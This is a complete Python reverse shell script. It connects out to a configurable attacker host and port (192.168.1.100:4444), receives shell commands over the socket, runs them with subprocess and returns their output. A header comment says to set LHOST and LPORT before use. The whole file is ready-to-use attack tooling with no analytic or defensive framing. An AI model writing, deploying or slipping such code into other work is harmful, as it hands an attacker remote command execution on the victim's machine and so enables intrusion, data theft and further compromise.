#!/usr/bin/env python3
# Python Reverse Shell
# Configure LHOST and LPORT before use

import socket
import subprocess
import os

LHOST = "192.168.1.100"
LPORT = 4444

def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((LHOST, LPORT))
    
    while True:
        try:
            s.send(b"$ ")
            cmd = s.recv(1024).decode().strip()
            
            if cmd.lower() in ["exit", "quit"]:
                break
            
            if cmd.startswith("cd "):
                os.chdir(cmd[3:])
                s.send(b"")
            else:
                output = subprocess.getoutput(cmd)
                s.send(output.encode() + b"\n")
        except:
            break
    
    s.close()

if __name__ == "__main__":
    reverse_shell()